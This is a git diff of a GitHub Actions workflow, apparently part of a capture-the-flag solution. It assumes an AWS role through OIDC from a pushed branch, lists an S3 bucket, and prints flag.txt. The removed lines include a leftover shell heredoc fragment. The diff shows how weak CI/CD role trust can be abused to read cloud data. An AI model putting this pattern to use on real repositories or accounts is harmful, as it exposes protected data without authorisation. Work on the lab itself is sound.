@@ -10,42 +10,23 @@ permissions:
   contents: read
 
 jobs:
-  flag:
+  get-the-flag:
     runs-on: ubuntu-latest
-
     steps:
-      - uses: aws-actions/configure-aws-credentials@v4
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - run: |
+      - name: Get the flag
+        run: |
+          echo "=== Listing the bucket ==="
+          aws s3 ls s3://codec4f26c862a321ef5/
+          echo ""
+          echo "=== Downloading flag.txt ==="
           aws s3 cp s3://codec4f26c862a321ef5/flag.txt .
-          echo "=== FLAG ==="
+          echo ""
+          echo "=== FLAG CONTENT ==="
           cat flag.txt
-EOFcat > .github/workflows/get-flag.yml <<'EOF'
-name: get-flag
-
-on:
-  push:
-    branches: [corgi]
-  workflow_dispatch:
-
-permissions:
-  id-token: write
-  contents: read
-
-jobs:
-  flag:
-    runs-on: ubuntu-latest
-
-    steps:
-      - uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
-          aws-region: us-east-1
-
-      - run: |
-          aws s3 cp s3://codec4f26c862a321ef5/flag.txt .
-          echo "=== FLAG ==="
-          cat flag.txt
+          echo ""
